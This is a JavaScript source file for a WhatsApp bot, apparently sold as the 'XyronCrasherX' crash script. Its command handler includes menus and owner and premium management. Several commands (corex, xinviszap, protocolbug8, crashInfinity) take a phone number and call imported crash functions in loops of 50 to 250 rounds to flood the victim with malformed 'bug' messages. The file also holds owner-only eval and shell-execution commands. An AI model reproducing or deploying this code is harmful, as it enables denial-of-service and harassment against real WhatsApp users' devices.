require('./settings')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')
const { XinvisZap1, XinvisZap2, protocolbug6, protocolbug8, CrashInfinity } = require('./CoreXzapFunction/XinvisZap')

module.exports = Raflie = async (Raflie, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);

//------------------- Prefix Command Settings
const budy = (typeof m.text == 'string' ? m.text: '')
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';

//--------------------- Database
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await Raflie.decodeJid(Raflie.user.id)
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid

//--------------------- Group Const
const groupMetadata = m.isGroup ? await Raflie.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"

//-------------- Waktu
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

//----------- Public
if (!Raflie.public) {
if (!isOwner) return
}

//------------ Resize Image Function 
let resize = async (image, width, height) => {
    let op = await jimp.read(image)
    let resultImage = await op.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return resultImage
}


//------------ Photo List
let Qphoto = [
    "https://files.catbox.moe/2eti2z.jpg",
]
let canQu = Qphoto[Math.floor(Math.random() * Qphoto.length)]

const zPhoto = ["https://files.catbox.moe/2eti2z.jpg"]
let AtCan = zPhoto[Math.floor(Math.random() * zPhoto.length)]

//------------ StatsQ
const statsQ = {
    key: {
        remoteJid: "120363370626418572@g.us",
        participant: "0@s.whatsapp.net",
    },
    message: {
        groupStatusMentionMessage: {
            message: {
                protocolMessage: {
                    type: 24,
                    additionalInfo: "",
                }
            }
        }
    }
}

//------------ Zets Configuration
const icons = []

const QuotedJpg = icons[Math.floor(Math.random() * Qphoto.length)]

//------------- Color Tag Align


//------------- Console Log
if (m.message) {
    console.log(chalk.hex('#3498db')(`message " ${m.message} " dari ${pushname} di ${m.isGroup ? `grup ${groupMetadata.subject}` : 'private chat'}`));
}

//-------------------- Reply Raf Qc
const rafreplyQc = (teks) => {
  let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: {
          body: {
            text: `${teks}`, 
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{"display_text":"Download Script","url":"https://whatsapp.com/channel/0029VbCaritJkK73qfHPBb3Y"}`
              }
            ]
          }
        }
      }
    }
  }, { quoted: lolQc });
  return Raflie.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
//--------------------- End fungsi

//------------------- Quoted Messags
const lolQc = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: "",
      itemCount: "3333333",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `㕚 ʀᴀғʟɪᴇ ᴍᴏᴅs`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
//--------------------- End fungsi

//------------------- InvisQcl
//-------- End Sqcl


//PASTI PADA MAU RINAME YA? JANGAN DONG NTR ERROR PANIK WKWKWKWK

switch(command) {
case 'menu': {
let teks = `
—( Si Bro, ${pushname} ) 

JapanaseX
⧼ Sukuriputo bagu WhatsApp XyronCoreX Kurasshā Shisutemu Hakaisha WhatsApp ⧽

☇ -( XyronCrasherX )- ☇
Sakuseisha : RaflieMods
Sukuriputo : XyronCrasherCoreX
Bājon : 3.0  
Gengo : JavaScript  
Jikan : ${time}
`
const buttons = [
      { buttonId: ".tqto", buttonText: { displayText: "𝑻𝒉𝒂𝒏𝒌𝒔𝑻𝒐" }, type: 1 }
    ];
const buttonMessage = {
        image: { url: 'https://files.catbox.moe/2eti2z.jpg' },
        fileLength: 1,
        caption: teks, 
        gifPlayback: true,
        gifAttribution: 5,
        hasMediaAttachment: true,
        footer: "☇ XyronCoreX ☇",
        buttons: buttons,
        headerType: 1,
       
        viewOnce: true,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363400321589684@newsletter',
                newsletterName: '© 𝐑𝐚ͧ͟𝐟̋𝐥̶𝐢𝐞̶͟𝐌𝐨̶̋𝐝𝐬𝐬'
            }
        }
    };
        const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
            title: "",
            sections: [
            {
            title: "☇ 𝐗𝐱𝐌𝐜 ☇",
            highlight_label: "𝐁𝐮𝐠𝐗",
            rows: [
          {
            title: "☇ 𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮 ☇",
            description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.bugmenu`, 
          },
          {
            title: "☇ 𝐀𝐥𝐥 ϟ 𝐌𝐞𝐧𝐮 ☇",
description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.allmenu`,      
          },
        ]},
      {
        title: `☇ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫𝐬 ϟ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ☇`, 
        highlight_label: `𝐑𝐚𝐟𝐥𝐢𝐞𝐌𝐨𝐝𝐬𝐬👀`,
        rows: [
          {
            title: "☇ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 ☇",
            description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.owner`,
          },
        ]},
      {
        title: `☇ 𝐂𝐫𝐞𝐝𝐢𝐭 ϟ 𝐒𝐜𝐫𝐢𝐩𝐭 ☇`, 
        highlight_label: `☇ XyronCrasherX ☇`,
        rows: [
          {
            title: "☇ 𝐓𝐡𝐚𝐧𝐤𝐬 ϟ 𝐓𝐨 ☇",
            description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.tqto`,
                              },                              
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);
    
    await Raflie.sendMessage(m.chat, buttonMessage, { quoted: lolQc });       
    
};
break

case 'allmenu': {
let teks = `
☇ -( XyronCrasherX )- ☇
Sakuseisha : RaflieMods
Sukuriputo : XyronCrasherCoreX
Bājon : 3.0  
Gengo : JavaScript  
Jikan : ${time}

☇ -( BugMenuX )- ☇
〉 .corex *628xxx*
〉 .xyroninvisx *628xxx*
〉 .qcxinvis *628xxx*
〉 .invisql *628xxx*
〉 .xinviszap *628xxx*
〉 .protocolbug8 *628xxx*
〉 .crashInfinity *628xxx*
〉 .epui *Comming*

☇ -( OwnerAccesX )- ☇
〉 .addowner *628xxx*
〉 .delowner *628xxx* 
〉 .addpremium *628xxx*
〉 .delpremium *628xxx*
〉 .self *Private*
〉 .public *Everyone*
`
const buttons = [
      { buttonId: ".tqto", buttonText: { displayText: "𝑻𝒉𝒂𝒏𝒌𝒔𝑻𝒐" }, type: 1 }
    ];
const buttonMessage = {
        image: { url: 'https://files.catbox.moe/2eti2z.jpg' },
        fileLength: 1,
        caption: teks, 
        gifPlayback: true,
        gifAttribution: 5,
        hasMediaAttachment: true,
        footer: "☇ XyronCoreX ☇",
        buttons: buttons,
        headerType: 1,
       
        viewOnce: true,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363400321589684@newsletter',
                newsletterName: '© 𝐑𝐚ͧ͟𝐟̋𝐥̶𝐢𝐞̶͟𝐌𝐨̶̋𝐝𝐬𝐬'
            }
        }
    };
        const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
            title: "",
            sections: [
            {
            title: "☇ 𝐗𝐱𝐌𝐜 ☇",
            highlight_label: "𝐁𝐮𝐠𝐗",
            rows: [
          {
            title: "☇ 𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮 ☇",
            description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.bugmenu`, 
          },
          {
            title: "☇ 𝐀𝐥𝐥 ϟ 𝐌𝐞𝐧𝐮 ☇",
description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.allmenu`,      
          },
        ]},
      {
        title: `☇ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫𝐬 ϟ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ☇`, 
        highlight_label: `𝐑𝐚𝐟𝐥𝐢𝐞𝐌𝐨𝐝𝐬𝐬👀`,
        rows: [
          {
            title: "☇ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 ☇",
            description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.owner`,
          },
        ]},
      {
        title: `☇ 𝐂𝐫𝐞𝐝𝐢𝐭 ϟ 𝐒𝐜𝐫𝐢𝐩𝐭 ☇`, 
        highlight_label: `☇ XyronCrasherX ☇`,
        rows: [
          {
            title: "☇ 𝐓𝐡𝐚𝐧𝐤𝐬 ϟ 𝐓𝐨 ☇",
            description: "☇ 𝐑𝐚𝐟𝐥𝐢𝐞𝐞𝐌𝐝𝐬 ☇",
            id: `.tqto`,
                              },                              
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);
    
    await Raflie.sendMessage(m.chat, buttonMessage, { quoted: lolQc });       
    
};
break

case 'bugmenu': {
let tot = `
Fitur ini sedang maintenance, mungkin next update akan gw tambahin 

© RaflieMods
`
rafreplyQc(tot) 
}
break;

case 'tqto': {
let crot = `
あ Raflie Modz *Developer*
あ BarModss Official *Teacher*
あ Corzaa *BestFriends*
あ Rapli *BestFriends*
あ Depayyyy *BestFriends*
あ LangitTech *MyBro*
あ Always Riky *BestFriends*
あ BenzDev *BestFriends*
あ Daffa Ravage *BestFriends*
あ HamzDev *BestFriends*
あ Kyami *BestFriends*
あ Azure *Owner*
あ Ardz *Owner*
あ Fury *Owner*
あ Dafa *Partner*
あ Renna *Partner*
`
rafreplyQc(crot) 
}
break;

case 'addowner': case 'addown': {
    if (!isOwner) return rafreplyQc("Owner only.");
    if (!args[0]) return rafreplyQc(`Usage: ${command} 62xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    let checkNumber = await Raflie.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return rafreplyQc("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    rafreplyQc("Owner added successfully.");
}
break;

case 'delowner': case 'delown': {
    if (!isOwner) return rafreplyQc("Owner only.");
    if (!args[0]) return rafreplyQc(`Usage: ${command} 62xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    rafreplyQc("Owner removed successfully.");
}
break;

case 'owner': {
    const ownerNumber = '6285123965378@s.whatsapp.net';
    const ownerName = '© RaflieModsss'; 

    await Raflie.sendMessage(m.chat, {
        contacts: {
            displayName: ownerName,
            contacts: [
                {
                    displayName: ownerName,
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nTEL;type=CELL;type=VOICE;waid=6285123965378:+62851-2396-5378\nEND:VCARD`
                }
            ]
        }
    }, { quoted: lolQc });

    break;
}

case 'addpremium': case 'addprem': {
    if (!isOwner) return rafreplyQc("Owner only!");
    if (!args[0]) return rafreplyQc(`Usage: ${prefix + command} 62xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await Raflie.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return rafreplyQc("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    rafreplyQc("Success! User added to premium.");
}
break;

case 'delpremium': case 'delprem': {
    if (!isOwner) return rafreplyQc("Owner only!");
    if (!args[0]) return rafreplyQc(`Usage: ${prefix + command} 62xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        rafreplyQc("Success! User removed from premium.");
    } else {
        rafreplyQc("User is not in the premium list.");
    }
}
break;

case 'public': {
    if (!isOwner) return rafreplyQc("Owner only.");
    Raflie.public = true;
    rafreplyQc("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isOwner) return rafreplyQc("Owner only.");
    Raflie.public = false;
    rafreplyQc("Bot set to private mode.");
}
break;

case 'qcxinvis': 
case 'invisql': 
case 'xinviszap': {
if (!isPremium && !isOwner) return rafreplyQc(`No Akses\n[𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗯𝘂𝘆 𝘀𝗰𝗿𝗶𝗽𝘁!!]`)
if (!q) return rafreplyQc(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rafreplyQc(`⪨ 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗙𝘂𝗹𝗹 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗕𝘂𝗴`)
for (let i = 0; i < 150; i++) {
await XinvisZap1(Raflie, target, false);
await XinvisZap1(Raflie, target, true);
}
}
break

case 'xyroninvisx': 
case 'corex': {
if (!isPremium && !isOwner) return rafreplyQc(`No Akses\n[𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗯𝘂𝘆 𝘀𝗰𝗿𝗶𝗽𝘁!!]`)
if (!q) return rafreplyQc(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rafreplyQc(`⪨ 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗙𝘂𝗹𝗹 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗕𝘂𝗴`)
for (let i = 0; i < 50; i++) {
XinvisZap2(target)
XinvisZap2(target)
XinvisZap2(target)
protocolbug6(target, false)
protocolbug6(target, true)
}
}
break

case 'protocolbug8': {
    if (!isOwner && !isPremium) return rafreplyQc("*Access Denied: Premium Users Only!*");
    if (!q) return rafreplyQc(`Example Usage:\n .${command} 62xx / @tag`);
    let jidx = q.replace(/[^0-9]/g, "");
    let isTarget = `${jidx}@s.whatsapp.net`;
    Rafliereply(`*Success! ${command} sent to ${isTarget}*`);
    //Paramater
    await protocolbug8(isTarget, true)
    
  console.log(chalk.red.bold("Loop Finished! All messages are processed."))
}
break

case 'crashInfinity': {
if (!isPremium && !isOwner) return rafreplyQc(`No Akses\n[𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗯𝘂𝘆 𝘀𝗰𝗿𝗶𝗽𝘁!!]`)
if (!q) return rafreplyQc(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rafreplyQc(`⪨ 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗙𝘂𝗹𝗹 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗕𝘂𝗴`)
for (let i = 0; i < 250; i++) {
await CrashInfinity(Raflie, target)
await CrashInfinity(Raflie, target)
await CrashInfinity(Raflie, target)
await CrashInfinity(Raflie, target)
}
}
break

/* KHUSUS VIP FITUR
case 'invisforce': {
if (!isOwner) return replybeton(`No Akses\n[𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗯𝘂𝘆 𝘀𝗰𝗿𝗶𝗽𝘁!!]`)
if (!q) return replybeton(`Example: ${prefix + command} 62×××`)
isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rafreplyQc(`な 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗙𝘂𝗹𝗹 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗕𝘂𝗴\n𝗞𝗹𝗶𝗸 𝗧𝗼𝗺𝗯𝗼𝗹 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗻𝗴𝗲𝗰𝗲𝗸 𝗧𝗮𝗿𝗴𝗲𝘁.`)
for (let i = 0; i < 15; i++) {
await invisSqL(isTarget)
await invisSqL(isTarget)
await invisSqL(isTarget)
}
}
break
*/

//-------------------------- Eval 
default:
if (budy.startsWith('<')) {
if (!isOwner) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isOwner) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})